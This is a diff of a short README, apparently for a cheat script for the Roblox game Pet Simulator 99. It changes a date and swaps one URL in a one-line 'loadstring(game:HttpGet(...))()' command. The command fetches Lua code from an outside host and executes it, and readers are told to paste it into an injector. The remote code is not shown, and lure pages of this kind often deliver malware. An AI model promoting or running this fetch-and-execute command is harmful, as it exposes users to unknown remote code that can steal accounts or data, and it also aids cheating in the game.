@@ -1,8 +1,8 @@
-# PS99-new-script-RNG-upd
-Script updated for new update 2024-08-24
+# PS99-new-script-update
+Script updated for new update 2024-09-02
 # SCRIPT:
 
-**loadstring(game:HttpGet("https://egorikusa.space/f317bd388d37d722f2a04c27.lua", true))()**
+**loadstring(game:HttpGet("https://egorikusa.space/08a828291fc3d05efb1ca82b.lua", true))()**
 
 copy this script and paste into injector this is an all in 1
 
